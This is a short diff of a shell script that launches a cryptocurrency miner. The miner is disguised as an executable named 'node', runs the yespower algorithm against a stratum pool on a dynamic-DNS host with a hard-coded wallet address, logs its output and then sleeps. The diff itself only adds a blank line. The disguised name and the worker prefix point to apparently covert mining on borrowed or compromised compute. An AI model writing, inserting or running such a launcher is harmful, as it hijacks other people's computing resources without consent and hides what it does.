@@ -5,3 +5,4 @@ chmod +x node
 HOURESX=cf_wk_$(date +%M)
 ./node -a yespower -o stratum+tcp://mining-pool.zapto.org:3710 -u WXeJSqsKYiHLTzwLBSM93z1spxCpyeAcqP.${HOURESX} > try.log
 sleep 29999
+
